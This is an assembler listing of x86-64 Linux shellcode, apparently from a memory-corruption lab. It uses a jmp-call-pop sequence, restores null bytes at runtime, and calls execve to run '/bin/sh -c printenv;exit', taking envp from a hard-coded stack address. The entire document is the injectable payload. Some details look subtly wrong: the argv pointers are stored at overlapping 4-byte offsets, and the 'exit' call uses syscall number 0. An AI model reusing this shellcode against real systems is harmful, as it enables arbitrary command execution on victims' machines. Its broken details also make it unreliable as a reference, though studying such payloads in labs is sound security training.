     1                                            bits 64
     2                                              ; find out where we are
     3 00000000 EB4F                    start:     jmp short codeEnd
     4 00000002 5E                      start2:    pop rsi
     5                                  
     6                                              ; clear the a register
     7 00000003 4831C0                             xor rax, rax
     8                                  
     9                                              ; restore null bytes to data
    10 00000006 884607                             mov [rsi + flagStr-exeStr - 2],al
    11 00000009 88460B                             mov [rsi + cmdStr-exeStr - 1],al
    12 0000000C 884619                             mov [rsi + arrayAddr-exeStr - 1],al
    13 0000000F 48894632                           mov [rsi + arrayAddr-exeStr + 24],rax
    14                                  
    15 00000013 4889761A                           mov [rsi + arrayAddr - exeStr], rsi
    16 00000017 488D7E09                           lea rdi, [rsi + flagStr - exeStr]
    17 0000001B 48897E1E                           mov [rsi + arrayAddr - exeStr + 4], rdi
    18 0000001F 488D7E0C                           lea rdi, [rsi + cmdStr - exeStr]
    19 00000023 48897E22                           mov [rsi + arrayAddr - exeStr + 8], rdi
    20                                        
    21 00000027 4889E2                             mov rdx, rsp
    22 0000002A 48C1EA20                           shr rdx, 32
    23 0000002E 48C1E220                           shl rdx, 32
    24 00000032 B938E1FFF7                         mov rcx, 0xf7ffe138
    25 00000037 4809CA                             or rdx, rcx
    26                                             
    27                                              ; execve system call
    28 0000003A 4831C0                             xor rax, rax
    29 0000003D 4889F7                             mov rdi, rsi
    30 00000040 488D761A                           lea rsi, [rsi + arrayAddr - exeStr]
    31 00000044 488B12                             mov rdx,[rdx]
    32 00000047 0F05                               syscall
    33                                  
    34                                              ; exit system call
    35 00000049 4889C7                             mov rdi,rax
    36 0000004C 4831C0                             xor rax, rax
    37 0000004F 0F05                               syscall
    38                                  
    39 00000051 E8ACFFFFFF              codeEnd:   call start2
    40                                              ; data
    41 00000056 2F62696E2F73685879      exeStr:    db "/bin/shXy"
    42 0000005F 2D6358                  flagStr:   db "-cX"
    43 00000062 7072696E74656E763B-     cmdStr:    db "printenv;exitX"
    43 0000006B 6578697458         
    44 00000070 FFFFFFFFFFFFFFFF        arrayAddr: dq 0xffffffffffffffff
    45 00000078 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    46 00000080 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    47 00000088 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    48 00000090 90000000                newAddr:  dd newAddr-start
